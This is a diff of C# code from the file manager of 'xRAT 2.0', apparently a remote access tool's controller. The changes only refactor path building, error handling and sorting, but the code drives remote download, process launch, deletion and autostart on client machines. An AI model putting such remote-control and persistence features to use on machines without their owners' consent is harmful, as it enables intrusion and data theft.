@@ -102,9 +102,9 @@ namespace xServer.Forms
                 {
                     string path = _currentDir;
                     if (path.EndsWith(@"\"))
-                        path = path + files.SubItems[0].Text;
+                        path += files.SubItems[0].Text;
                     else
-                        path = path + @"\" + files.SubItems[0].Text;
+                        path += @"\" + files.SubItems[0].Text;
 
                     int ID = new Random().Next(int.MinValue, int.MaxValue - 1337) + files.Index; // ;)
 
@@ -112,7 +112,7 @@ namespace xServer.Forms
                     {
                         new Core.Packets.ServerPackets.DownloadFile(path, ID).Execute(_connectClient);
 
-                        this.Invoke((MethodInvoker) delegate
+                        this.Invoke((MethodInvoker)delegate
                         {
                             ListViewItem lvi = new ListViewItem(new string[] { ID.ToString(), "Downloading...", files.SubItems[0].Text });
                             lstTransfers.Items.Add(lvi);
@@ -130,9 +130,9 @@ namespace xServer.Forms
                 {
                     string path = _currentDir;
                     if (path.EndsWith(@"\"))
-                        path = path + files.SubItems[0].Text;
+                        path += files.SubItems[0].Text;
                     else
-                        path = path + @"\" + files.SubItems[0].Text;
+                        path += @"\" + files.SubItems[0].Text;
 
                     if (_connectClient != null)
                         new Core.Packets.ServerPackets.StartProcess(path).Execute(_connectClient);
@@ -151,9 +151,9 @@ namespace xServer.Forms
                     bool isDir = files.Tag.ToString() == "dir";
 
                     if (path.EndsWith(@"\"))
-                        path = path + files.SubItems[0].Text;
+                        path += files.SubItems[0].Text;
                     else
-                        path = path + @"\" + files.SubItems[0].Text;
+                        path += @"\" + files.SubItems[0].Text;
 
                     if (InputBox.Show("New name", "Enter new name:", ref newName) == DialogResult.OK)
                     {
@@ -180,9 +180,9 @@ namespace xServer.Forms
                     string text = string.Format("Are you sure you want to delete this {0}", (isDir) ? "directory?" : "file?");
 
                     if (path.EndsWith(@"\"))
-                        path = path + files.SubItems[0].Text;
+                        path += files.SubItems[0].Text;
                     else
-                        path = path + @"\" + files.SubItems[0].Text;
+                        path += @"\" + files.SubItems[0].Text;
 
                     if (MessageBox.Show(text, "Are you sure?", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                     {
@@ -201,9 +201,9 @@ namespace xServer.Forms
                 {
                     string path = _currentDir;
                     if (path.EndsWith(@"\"))
-                        path = path + files.SubItems[0].Text;
+                        path += files.SubItems[0].Text;
                     else
-                        path = path + @"\" + files.SubItems[0].Text;
+                        path += @"\" + files.SubItems[0].Text;
 
                     using (var frm = new FrmAddToAutostart(path))
                     {
@@ -228,21 +228,38 @@ namespace xServer.Forms
 
         private void btnOpenDLFolder_Click(object sender, EventArgs e)
         {
-            string downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + _connectClient.EndPoint.Address.ToString());
+            try
+            {
+                string downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + _connectClient.EndPoint.Address.ToString());
 
-            if (Directory.Exists(downloadPath))
-                Process.Start(downloadPath);
-            else
-                MessageBox.Show("No files downloaded yet!", "xRAT 2.0 - File Manager", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                if (Directory.Exists(downloadPath))
+                {
+                    Process.Start(downloadPath);
+                }
+                else
+                {
+                    MessageBox.Show("No files downloaded yet!", "xRAT 2.0 - File Manager", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                }
+            }
+            catch (Exception ex)
+            {
+                // If the Exception is because of a failed attempt to start the Process.
+                if (ex is System.ComponentModel.Win32Exception || ex is ObjectDisposedException || ex is FileNotFoundException)
+                {
+                    MessageBox.Show("Unable to start the process associated with the download path.", "Error");
+                }
+            }
         }
 
         private void ctxtCancel_Click(object sender, EventArgs e)
         {
             foreach (ListViewItem transfer in lstTransfers.SelectedItems)
             {
-                if (!transfer.SubItems[1].Text.StartsWith("Downloading")) return;
-                if (_connectClient != null)
-                    new Core.Packets.ServerPackets.DownloadFileCanceled(int.Parse(transfer.Text)).Execute(_connectClient);
+                if (transfer.SubItems[1].Text.StartsWith("Downloading"))
+                {
+                    if (_connectClient != null)
+                        new Core.Packets.ServerPackets.DownloadFileCanceled(int.Parse(transfer.Text)).Execute(_connectClient);
+                }
             }
         }
 
@@ -252,10 +269,16 @@ namespace xServer.Forms
             if (e.Column == _lvwColumnSorter.SortColumn)
             {
                 // Reverse the current sort direction for this column.
-                if (_lvwColumnSorter.Order == SortOrder.Ascending)
-                    _lvwColumnSorter.Order = SortOrder.Descending;
-                else
-                    _lvwColumnSorter.Order = SortOrder.Ascending;
+                switch (_lvwColumnSorter.Order)
+                {
+                    case SortOrder.Ascending:
+                        _lvwColumnSorter.Order = SortOrder.Descending;
+                        break;
+                    case SortOrder.Descending:
+                    default:
+                        _lvwColumnSorter.Order = SortOrder.Ascending;
+                        break;
+                }
             }
             else
             {
